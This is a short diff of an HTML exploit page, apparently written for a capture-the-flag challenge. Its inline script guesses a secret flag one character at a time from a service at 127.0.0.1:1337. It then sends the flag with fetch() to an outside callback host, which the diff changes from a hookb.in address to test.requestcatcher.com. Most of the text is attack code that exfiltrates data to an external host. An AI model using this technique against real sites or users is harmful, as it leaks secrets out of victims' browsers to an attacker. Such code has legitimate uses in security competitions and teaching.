@@ -1,6 +1,6 @@
 <html>
     <script>
-        var callback = "hookb.in/aBkddMEYa9TXQ9kkQ83R";
+        var callback = "test.requestcatcher.com";
         var target = "127.0.0.1:1337";
         
         var abc = "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
@@ -31,7 +31,7 @@
 
                 if(flag.length == limit) break;
             }           
-            fetch(`https://${callback}?flag=${flag}`, {method:'get', mode:'no-cors'});
+            fetch(`https://${callback}/?flag=${flag}`, {method:'get', mode:'no-cors'});
         }
 
         getFlag(abc);
